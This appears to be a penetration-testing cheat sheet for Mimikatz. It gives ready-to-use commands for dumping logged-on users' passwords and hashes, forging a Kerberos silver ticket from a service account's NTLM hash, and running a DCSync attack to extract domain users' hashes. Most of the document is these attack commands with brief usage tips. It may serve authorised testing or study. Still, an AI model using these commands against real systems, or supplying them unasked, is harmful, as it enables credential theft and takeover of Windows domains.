# Mimikatz


## Silver Tickets

cheat sheet 
[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)

Using an admin powershell and open mimikatz:

```
privilege::debug
```

get passwords of logged on users:

```
sekurlsa::logonpasswords
```
Now, if we get the NTLM hash of an SPN with privleges to a service we want access to, we can forge a silver ticket.

```
kerberos::golden /sid:${DOMAIN_SID} /domain:${DOMAIN} /ptt /target:${RHOST_IP} /service:http /rc4:${NTLM_HASH} /user:${DOMAIN_USER}
```
The `$DOMAIN_SID` can be retrieved by doing `whoami /user` from a domain user and getting everything but the last section (which identifies the user).
Note that the user argument just has to be a valid user from the domain.
What determines the access rights is the NTLM hash and not the user, so you can even put the current user.

Afterwards, do `exit` and check that the ticket is loaded into memory with `klist`.

## DSYNC

mimikatz can help us attempt to get the NTLM of a user in the domain by performing a dsync attack:

```
lsadump::dcsync /user:${DOMAIN}\${USER}
```
